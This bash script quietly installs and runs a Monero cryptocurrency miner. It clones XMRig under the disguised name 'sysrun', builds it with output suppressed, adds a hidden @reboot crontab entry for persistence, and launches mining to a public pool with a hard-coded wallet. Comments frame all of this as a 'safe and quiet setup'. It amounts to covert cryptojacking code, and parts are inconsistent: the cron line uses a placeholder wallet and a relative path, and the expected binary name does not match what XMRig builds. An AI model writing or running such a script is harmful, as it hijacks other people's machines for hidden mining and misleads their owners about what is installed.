#!/bin/bash

# Safe and quiet setup
apt update -y && apt install -y sudo nano curl wget git cmake build-essential libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1

# Clone tool if not already present
if [ ! -d "/opt/sysrun" ]; then
    git clone https://github.com/xmrig/xmrig.git /opt/sysrun
fi

# Build the tool
cd /opt/sysrun
if [ ! -f "build/sysrun" ]; then
    mkdir -p build && cd build
    cmake .. > /dev/null && make -j$(nproc) > /dev/null
else
    cd build
fi

# Setup persistent background execution on reboot (no names shown)
grep -q "sysrun" <(crontab -l 2>/dev/null) || (
    crontab -l 2>/dev/null
    echo "@reboot taskset -c 0-2 ./sysrun -o pool.supportxmr.com:3333 -u WALLET_HIDDEN -p node1 --coin monero --cpu-max-threads-hint=50"
) | crontab -

# Start quietly in background using 30–60% CPU
nohup taskset -c 0-2 ./sysrun -o pool.supportxmr.com:3333 -u 46mq2ZzCzce5JfVo42AFWJCWkTyTAwGF3gvr7KPmBVE3GBU2DWJncUTZxUswuHBFrsQL88wEn8dGK8PeagpmCRjFMswYgXU -p node1 --coin monero --cpu-max-threads-hint=50 > /dev/null 2>&1 &
